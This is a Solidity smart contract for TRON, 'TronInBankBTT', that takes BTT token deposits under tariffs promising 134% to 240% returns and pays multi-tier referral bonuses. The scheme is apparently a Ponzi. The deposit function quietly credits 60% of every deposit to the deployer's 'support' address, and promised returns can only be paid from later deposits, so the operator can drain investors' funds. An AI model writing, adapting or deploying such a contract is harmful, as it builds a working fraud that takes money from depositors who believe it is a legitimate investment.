//SourceUnit: troninbankbtt.sol




pragma solidity ^0.4.25;

contract TronInBankBTT {
  uint tokenId = 1002000;

  struct Tariff {
    uint time;
    uint percent;
  }

  struct Deposit {
    uint tariff;
    uint amount;
    uint at;
  }

  struct Investor {
    bool registered;
    address referer;
    uint referrals_tier1;
    uint referrals_tier2;
    uint referrals_tier3;
    uint referrals_tier4;
    uint balanceRef;
    uint totalRef;
    Deposit[] deposits;
    uint invested;
    uint paidAt;
    uint withdrawn;
  }

uint MIN_DEPOSIT = 50 trx;
uint START_AT = 22442985;

address public support = msg.sender;

Tariff[] public tariffs;
uint[] public refRewards;
uint public totalInvestors;
uint public totalInvested;
uint public totalRefRewards;
mapping (address => Investor) public investors;

event DepositAt(address user, uint tariff, uint amount);
event Withdraw(address user, uint amount);

function register(address referer) internal {
if (!investors[msg.sender].registered) {
investors[msg.sender].registered = true;
totalInvestors++;

if (investors[referer].registered && referer != msg.sender) {
investors[msg.sender].referer = referer;

address rec = referer;
for (uint i = 0; i < refRewards.length; i++) {
if (!investors[rec].registered) {
break;
}

if (i == 0) {
investors[rec].referrals_tier1++;
}
if (i == 1) {
investors[rec].referrals_tier2++;
}
if (i == 2) {
investors[rec].referrals_tier3++;
}
if (i == 3) {
investors[rec].referrals_tier4++;
}

rec = investors[rec].referer;
}
}
}
}

function rewardReferers(uint amount, address referer) internal {
address rec = referer;

for (uint i = 0; i < refRewards.length; i++) {
if (!investors[rec].registered) {
break;
}

uint a = amount * refRewards[i] / 100;
investors[rec].balanceRef += a;
investors[rec].totalRef += a;
totalRefRewards += a;

rec = investors[rec].referer;
}
}

constructor() public {
tariffs.push(Tariff(8 * 28800, 134));
tariffs.push(Tariff(12 * 28800, 180));
tariffs.push(Tariff(16 * 28800, 216));
tariffs.push(Tariff(20 * 28800, 240));

for (uint i = 4; i >= 1; i--) {
refRewards.push(i);
}
}

function deposit(uint tariff, address referer) external payable {
require(msg.tokenid == tokenId);

require(block.number >= START_AT);
require(msg.tokenvalue >= MIN_DEPOSIT);
require(tariff < tariffs.length);

register(referer);
uint t1 = msg.tokenvalue / 2;
uint t2 = msg.tokenvalue / 10;
uint t3 = t1 + t2;
investors[support].balanceRef += t3;
investors[support].totalRef += t3;
rewardReferers(msg.tokenvalue, investors[msg.sender].referer);

investors[msg.sender].invested += msg.tokenvalue;
totalInvested += msg.tokenvalue;

investors[msg.sender].deposits.push(Deposit(tariff, msg.tokenvalue, block.number));

emit DepositAt(msg.sender, tariff, msg.tokenvalue);
}

function withdrawable(address user) public view returns (uint amount) {
Investor storage investor = investors[user];

for (uint i = 0; i < investor.deposits.length; i++) {
Deposit storage dep = investor.deposits[i];
Tariff storage tariff = tariffs[dep.tariff];

uint finish = dep.at + tariff.time;
uint since = investor.paidAt > dep.at ? investor.paidAt : dep.at;
uint till = block.number > finish ? finish : block.number;

if (since < till) {
amount += dep.amount * (till - since) * tariff.percent / tariff.time / 100;
}
}
}

function profit() internal returns (uint) {
Investor storage investor = investors[msg.sender];

uint amount = withdrawable(msg.sender);

amount += investor.balanceRef;
investor.balanceRef = 0;

investor.paidAt = block.number;

return amount;
}

function withdraw() external {
uint amount = profit();
msg.sender.transferToken(amount, tokenId);
investors[msg.sender].withdrawn += amount;

emit Withdraw(msg.sender, amount);
}
}